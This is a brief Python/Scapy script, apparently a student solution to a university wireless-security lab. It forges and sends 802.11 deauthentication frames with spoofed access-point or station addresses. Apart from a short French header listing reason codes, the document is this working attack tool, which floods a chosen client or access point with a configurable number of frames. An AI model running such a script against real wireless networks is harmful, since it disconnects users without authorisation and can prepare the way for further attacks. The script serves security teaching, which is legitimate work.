# Python 3.7.6
# 
# Auteurs: Adrien Barth, Lionel Burgbacher
# Date:    02.03.2020
# Source:  https://www.shellvoide.com/python/forge-and-transmit-de-authentication-packets-over-the-air-in-scapy/
# 
# Description:
# Développer un script en Python/Scapy capable de générer et envoyer des trames de déauthentification.
# Le script donne le choix entre des Reason codes différents (liste ci-après)
# et doit pouvoir déduire si le message doit être envoyé à la STA ou à l'AP :
#   1 - Unspecified
#   4 - Disassociated due to inactivity
#   5 - Disassociated because AP is unable to handle all currently associated stations
#   8 - Deauthenticated because sending STA is leaving BS
#

import argparse
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

parser = argparse.ArgumentParser(description='SWI-Lab-01-Deauthentication-Attack')
parser.add_argument("-r", "--reason", required=True, type=int, help="The 802.11 deauthentification reason code.")
parser.add_argument("-b", "--BSSID", required=True, help="BSSID")
parser.add_argument("-s", "--STA", required=True, help="STA")
parser.add_argument("-c", "--count", type=int, default=1, help="Number of packets to send")
parser.add_argument("-i", "--iface", default="wlan0mon", help="Interface used for the attack")
args = parser.parse_args()


'''
If the reason code is 8, we are sending from the STA to the BSSID
'''
if(args.reason == 8):
	dst = args.BSSID
	src = args.STA
else:
	dst = args.STA
	src = args.BSSID

'''
Generate a 802.11 deauthentication frame and send it N times
'''
frame = RadioTap() / Dot11(addr1=dst, addr2=src, addr3=src) / Dot11Deauth(reason=args.reason)
for _ in itertools.repeat(1, args.count):
	sendp(frame, iface=args.iface, verbose=False)